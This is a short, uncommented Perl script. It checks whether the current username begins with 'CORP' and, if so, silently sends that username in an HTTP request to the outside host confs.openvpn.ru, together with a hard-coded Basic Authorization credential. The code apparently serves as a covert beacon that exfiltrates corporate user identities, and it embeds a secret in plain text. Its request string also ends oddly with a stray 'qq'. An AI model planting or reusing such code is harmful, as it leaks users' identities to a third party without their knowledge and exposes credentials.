#!/usr/bin/perl

$username = $ENV{"username"};
if ($username=~/^CORP/) {
$|++;
use IO::Socket;
$web=IO::Socket::INET->new(PeerAddr=>"confs.openvpn.ru", PeerPort=>80) || die "error\n";
$web->autoflush(1);

print $web qq(GET /auth/rem.cgi?file=$username HTTP/1.0
Host: confs.openvpn.ru
Authorization: Basic c3VwcG9ydDpUcDBWa2VTYzQ=
User-Agent: Mozilla/4.0
Content-Type: text/html


qq);
close($web);
}
